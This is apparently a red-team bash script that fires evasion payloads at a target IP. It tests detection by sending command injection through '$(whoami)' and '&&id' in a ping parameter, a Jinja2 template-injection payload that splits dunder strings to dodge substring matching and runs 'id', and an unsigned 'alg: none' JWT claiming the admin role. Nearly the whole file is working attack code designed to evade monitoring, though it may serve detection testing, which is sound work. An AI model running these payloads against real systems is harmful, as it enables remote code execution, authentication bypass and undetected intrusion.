#!/bin/bash
TARGET_IP="$1"
echo "=== REDTEAM2_START $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="

echo "--- [R4] COMMAND INJECTION EVASION: uses dollar-paren and double-ampersand instead of semicolon/backtick/pipe ---"
curl -s -m 5 "http://$TARGET_IP/ping?host=127.0.0.1%24(whoami)" >/dev/null
curl -s -m 5 "http://$TARGET_IP/ping?host=127.0.0.1%26%26id" >/dev/null

echo "--- [R5] SSTI EVASION: split-string dunder technique, avoids literal double-underscore-class-double-underscore substring match ---"
curl -s -m 5 -G "http://$TARGET_IP/greet" --data-urlencode "note={{ self.__init__.__globals__['__built' + 'ins__']['__im' + 'port__']('os').popen('id').read() }}" >/dev/null

echo "--- [R6] Known blind spot check: JWT-style forged header (expected invisible to access-log monitoring) ---"
curl -s -m 5 "http://$TARGET_IP/login" -H "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ." >/dev/null

echo "=== REDTEAM2_END $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ) ==="
